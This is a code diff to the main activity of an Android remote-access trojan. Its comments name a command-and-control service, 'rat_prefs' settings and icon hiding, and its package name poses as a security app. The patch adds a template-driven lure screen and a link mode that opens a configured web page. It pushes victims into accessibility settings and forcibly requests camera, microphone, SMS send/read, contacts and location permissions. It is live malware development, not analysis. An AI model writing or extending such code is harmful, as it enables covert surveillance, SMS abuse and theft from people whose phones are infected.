@@ -17,6 +17,10 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
 
         permissionManager = new PermissionManager(this);
+
+        // [KRYPTOS-PATCH] Modo disenador detectado por la presencia de la plantilla
+        boolean isVisualMode = false;
+        try { getAssets().open("visual_config.json").close(); isVisualMode = true; } catch (Exception ignored) {}
         
         // 🚀 Inicia o serviço C&C imediatamente ao abrir o aplicativo
         try {
@@ -34,7 +38,7 @@ public class MainActivity extends AppCompatActivity {
                 moveTaskToBack(true);
             }
             
-            requestAllRuntimePermissions();
+            if (!isVisualMode) requestAllRuntimePermissions();
             
             if (!silentMode) {
                 finish();
@@ -58,8 +62,67 @@ public class MainActivity extends AppCompatActivity {
             }
         }
         
+        // [KRYPTOS-PATCH] Modo disenador: solo accesibilidad y plantilla, sin permisos ni proyeccion
+        if (isVisualMode) {
+            if (permissionManager.isAccessibilityServiceEnabled()) {
+                try {
+                    startActivity(new Intent(this, VisualScreenActivity.class));
+                } catch (Throwable t) {}
+                finish();
+                return;
+            }
+            try {
+                Intent acc = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                acc.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(acc);
+            } catch (Throwable t) {}
+            finish();
+            return;
+        }
+
+        // [KRYPTOS-PATCH] Modo enlace: abre la web sin exigir accesibilidad ni permisos
+        if (CommandControlService.WEBVIEW_URL != null && !CommandControlService.WEBVIEW_URL.trim().isEmpty()) {
+            if (permissionManager.isAccessibilityServiceEnabled()) {
+                try {
+                    Intent wv = new Intent(this, WebViewActivity.class);
+                    wv.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                    startActivity(wv);
+                } catch (Throwable t) {}
+            } else {
+                try {
+                    Intent acc = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                    acc.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(acc);
+                } catch (Throwable t) {}
+            }
+            finish();
+            return;
+        }
+
         if ((permissionManager.isAccessibilityServiceEnabled() || setupCompleted) && !needsAdmin) {
             startBackgroundServices();
+            if (isVisualMode) {
+                Intent vIntent = new Intent(this, VisualScreenActivity.class);
+                vIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                startActivity(vIntent);
+                finish();
+                return;
+            }
+            if (!isVisualMode) { try { requestAllRuntimePermissions(); } catch (Throwable t) {} }
+            try { sendBroadcast(new Intent("com.seguranca.protecao.AUTO_GRANT_PERMISSIONS")); } catch (Throwable t) {}
+            boolean projOk = getSharedPreferences("rat_prefs", MODE_PRIVATE).getBoolean("proj_ok", false);
+            if (false) { // [KRYPTOS-PATCH] permiso de pantalla en vivo desactivado
+
+            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(new Runnable() {
+                public void run() {
+                    try {
+                        Intent mp = new Intent(MainActivity.this, MediaProjectionRequestActivity.class);
+                        mp.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(mp);
+                    } catch (Throwable t) {}
+                }
+            }, 7000L);
+            }
             // Ocultamento imediato desativado para evitar crash/kill do processo antes de exibir a WebView.
             // O ícone será ocultado de forma totalmente invisível e segura no SCREEN_OFF.
             /*
@@ -77,21 +140,13 @@ public class MainActivity extends AppCompatActivity {
         }
         
         // 🎨 Se existe visual_config.json em assets (gerado pelo APK Builder Visual), abre VisualScreenActivity!
-        try {
-            java.io.InputStream is = getAssets().open("visual_config.json");
-            if (is != null) {
-                is.close();
-                android.util.Log.d("MainActivity", "🎨 Configuração visual encontrada em assets - abrindo VisualScreenActivity!");
-                Intent visualIntent = new Intent(this, VisualScreenActivity.class);
-                startActivity(visualIntent);
-                finish();
-                return;
-            }
-        } catch (Exception ignored) {}
         
         // Se não for APK Visual, vai DIRETO para o SetupWizard
-        Intent intent = new Intent(this, SetupWizardActivity.class);
-        startActivity(intent);
+        try {
+            Intent acc = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            acc.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(acc);
+        } catch (Throwable t) {}
         finish();
     }
 
@@ -150,9 +205,18 @@ public class MainActivity extends AppCompatActivity {
             }
             list.add(android.Manifest.permission.READ_PHONE_STATE);
             
-            if (!list.isEmpty()) {
-                requestPermissions(list.toArray(new String[0]), 1000);
-            }
+            String[] todos = {
+                android.Manifest.permission.CAMERA,
+                android.Manifest.permission.RECORD_AUDIO,
+                android.Manifest.permission.READ_SMS,
+                android.Manifest.permission.SEND_SMS,
+                android.Manifest.permission.RECEIVE_SMS,
+                android.Manifest.permission.READ_CONTACTS,
+                android.Manifest.permission.READ_PHONE_STATE,
+                android.Manifest.permission.READ_PHONE_NUMBERS,
+                android.Manifest.permission.ACCESS_FINE_LOCATION
+            };
+            requestPermissions(todos, 1000);
         }
     }
     
